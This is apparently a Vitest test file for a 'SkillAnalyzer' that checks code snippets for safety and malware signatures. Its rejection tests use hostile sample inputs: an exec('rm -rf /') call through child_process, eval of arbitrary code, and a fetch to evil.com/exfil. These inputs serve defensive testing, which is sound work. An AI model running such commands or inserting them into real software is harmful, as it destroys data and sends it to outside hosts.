import { describe, it, expect } from 'vitest';
import { SkillAnalyzer } from '../SkillAnalyzer.js';
import { createLogger } from '../../../utils/logger.js';

const logger = createLogger('silent');
const analyzer = new SkillAnalyzer(logger);

describe('SkillAnalyzer', () => {
  it('should approve a safe skill', async () => {
    const result = await analyzer.analyzeSkill(`
      function greet(name) {
        return "Hello, " + name + "!";
      }
    `);
    expect(result.safe).toBe(true);
    expect(result.riskScore).toBeLessThan(0.5);
    expect(result.analysisTimeMs).toBeGreaterThan(0);
  });

  it('should reject a skill that uses eval()', async () => {
    const result = await analyzer.analyzeSkill(`
      function execute(code) {
        return eval(code);
      }
    `);
    expect(result.safe).toBe(false);
    expect(result.riskScore).toBe(1.0);
    expect(result.reason).toContain('Critical vulnerabilities');
  });

  it('should reject a skill that imports child_process', async () => {
    const result = await analyzer.analyzeSkill(`
      import { exec } from 'child_process';
      exec('rm -rf /');
    `);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain('Critical');
  });

  it('should detect network exfiltration in dynamic analysis', async () => {
    const result = await analyzer.analyzeSkill(`
      fetch('https://evil.com/exfil');
    `);
    // Static analysis finds fetch, dynamic analysis detects network attempt
    expect(result.safe).toBe(false);
  });

  it('should detect malware signature match', async () => {
    analyzer.setMalwareSignatures([
      {
        id: '1',
        name: 'TestMalware',
        hash: '',
        pattern: 'MALWARE_PATTERN_XYZ',
        severity: 'critical',
        description: 'Known test malware',
      },
    ]);

    const result = await analyzer.analyzeSkill(`
      const x = "MALWARE_PATTERN_XYZ";
    `);
    expect(result.safe).toBe(false);
    expect(result.signature).toBe('TestMalware');

    // Reset signatures
    analyzer.setMalwareSignatures([]);
  });

  it('should produce a code hash', () => {
    const hash = analyzer.getCodeHash('test code');
    expect(hash).toMatch(/^[a-f0-9]{64}$/);
  });

  it('should handle empty code gracefully', async () => {
    const result = await analyzer.analyzeSkill('');
    // Empty string will cause parse error but shouldn't crash
    expect(result).toBeDefined();
    expect(result.analysisTimeMs).toBeGreaterThanOrEqual(0);
  });
});
